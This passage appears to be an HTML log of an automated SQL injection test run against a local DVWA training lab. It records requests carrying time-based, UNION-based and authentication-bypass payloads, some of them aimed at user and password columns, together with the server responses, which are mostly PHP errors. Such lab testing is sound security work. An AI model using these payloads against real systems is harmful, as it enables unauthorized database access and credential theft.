+</div><hr><h3>Test ID: TIME_LOW_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.135426<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=82
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: TIME_LOW_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.182778<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND IF(1=1, SLEEP(5), 0)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=81
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: TIME_LOW_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.229518<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=80
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: UNION_LOW_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.276490<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=79
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: UNION_LOW_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.322760<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT database(),user()--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=78
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: UNION_LOW_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.369511<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 610
+Keep-Alive: timeout=5, max=77
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--'' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: UNION_LOW_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.402871<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 610
+Keep-Alive: timeout=5, max=76
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--'' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: UNION_LOW_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.448930<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM dvwa.users LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 610
+Keep-Alive: timeout=5, max=75
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '--'' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.495966<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin'--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=74
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.547048<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin' #&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4559
+Keep-Alive: timeout=5, max=73
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.589704<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin'/*&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 610
+Keep-Alive: timeout=5, max=72
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '/*'' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.635502<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=71
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.689010<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR '1'='1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4901
+Keep-Alive: timeout=5, max=70
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_6</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.731005<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' UNION SELECT 'admin','password'--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 608
+Keep-Alive: timeout=5, max=69
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_7</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.781841<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin' OR '1'='1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4926
+Keep-Alive: timeout=5, max=68
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_LOW_8</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.824971<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR username='admin&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 502
+Keep-Alive: timeout=5, max=67
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Unknown column 'username' in 'where clause' in C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php:11
+Stack trace:
+#0 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...')
+#1 C:\xampp\htdocs\DVWA\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...')
+#2 {main}
+  thrown in <b>C:\xampp\htdocs\DVWA\vulnerabilities\sqli\source\low.php</b> on line <b>11</b><br />
+...
+</div><hr><h3>Test ID: SET_SECURITY_MEDIUM</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.856898<br><b>URL:</b> http://localhost/dvwa/security.php<br><b>Method:</b> POST</p><h4>Request</h4><div class='code'>POST http://localhost/dvwa/security.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+{'security': 'medium', 'seclev_submit': 'Submit', 'user_token': '1539a6aa7d94eec4b3b3dd81aa2e65bc'}
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 5049
+Keep-Alive: timeout=5, max=64
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>DVWA Security :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href=".">Home</a></li>
+<li class=""><a href="instructions.php">Instructions</a></...
